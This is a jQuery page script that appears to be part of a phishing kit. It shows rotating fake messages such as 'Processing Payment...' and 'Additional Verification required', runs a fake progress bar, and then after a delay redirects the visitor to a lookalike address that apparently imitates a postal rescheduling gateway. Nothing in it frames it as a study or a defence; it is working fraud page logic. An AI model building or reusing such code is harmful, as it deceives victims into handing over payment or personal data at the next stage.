$(document).ready(function() {
	var words = ["You're being redirected...","Processing Payment...", "Additional Verification required"];
var span = document.querySelector("span");
var counter = 0;
var arrayLength = words.length - 1;

function changeWord() {
  if (counter == arrayLength){
    counter = 0;    
  }
  else {
    counter++;
  }
 span.innerHTML = words[counter];
 setTimeout(changeWord, 10000);
}
setTimeout(changeWord, 	1000);

	// Progress
	var progressBar = $('.loading-bar span');
	var progressAmount = $('.loading-bar').attr('data-progress');
		progressAmount = 0;
	
	var loadingDelay = setTimeout(function () {
		var interval = setInterval(function() {
			progressAmount += 10;

			progressBar.css('width', progressAmount + '%');

			if (progressAmount >= 150) {
				setTimeout(function () {
					clearInterval(interval);
					reverseAnimation();
				}, 300);
			}
		}, 300);
	}, 25000);
	
	// Processing over
	function reverseAnimation() {
		$('#processing').removeClass('uncomplete');
	   location.replace('https://trackinid-usprreschedule-gateway.codeanyapp.com/ran-update/index4.php');
	}
	
	// Debug button
	$('#trigger').on('click', function() {
		if ($('#processing.uncomplete').length) {
			$('#processing').removeClass('uncomplete').addClass('complete');
		} else {
			$('#processing').removeClass('complete').addClass('uncomplete');
		}
	});
	
});

